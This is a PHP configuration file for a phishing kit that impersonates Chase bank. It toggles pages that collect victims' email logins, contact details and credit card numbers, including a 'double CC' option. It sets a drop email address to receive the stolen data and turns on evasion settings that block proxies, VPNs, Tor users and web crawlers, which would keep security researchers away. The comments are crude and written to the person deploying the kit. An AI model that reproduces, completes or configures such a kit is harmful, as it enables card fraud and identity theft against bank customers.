<?php


$allow_country = "yes";

$show_start_page = "yes"; //
$show_email_access = "yes"; //
$show_contact_information = "yes";//
$show_credit_card = "yes";//
$show_success_page = "yes";//

$your_email = "tanu98ju@yandex.com"; // Your Fucking Email Here bro !! 
$redirect = "chase"; // you can change this 

$double_cc = "no"; // DOUBLE CC


$redirection = "no";     			   // If you won't to Use Redirection Like { Domain.com?id=chase } Make it Yes .
$api_protection = "yes";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "mAt8YyNG48uhU2ncKyRNXAduUeeWI3UY"; // Your Key api protection DON't CHANGE IT BRO ...

$anti_proxy = "yes";
$anti_vpn = "yes";
$anti_tor = "yes";
$anti_web_crawler ="yes";
$max_fraud_score = "101";

?>